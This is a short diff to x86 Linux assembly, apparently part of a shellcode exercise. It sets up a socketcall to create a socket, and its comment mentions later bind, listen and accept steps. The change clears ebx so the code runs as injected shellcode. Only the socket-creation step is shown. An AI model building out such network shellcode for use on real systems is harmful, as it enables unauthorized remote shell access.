@@ -10,7 +10,8 @@ _start:
     xor ecx, ecx ; clear out ecx
     mov ecx, esp ; move our arg values into ecx (place a pointer to these values with an address stored in ecx)
     mov al, 102   ; we move the socketcall syscall value into al, to avoid padding
-    mov bl, 0x1     ; we set function to 1, which is the value of socket (this will change later on to accomodate accept, listen, bind etc)
+    xor ebx, ebx  ; SHELLCODE DID NOT WORK WITHOUT THIS HERE, IT WILL WORK WITH NASM BUT NOT AS SHELLCODE DUE TO REGISTER NOISE!!!
+    mov bl, 1     ; we set function to 1, which is the value of socket
     int 0x80 ; call system interrupt 
     mov esi, eax ; we store the returning value of our syscall for later use in other functions
 
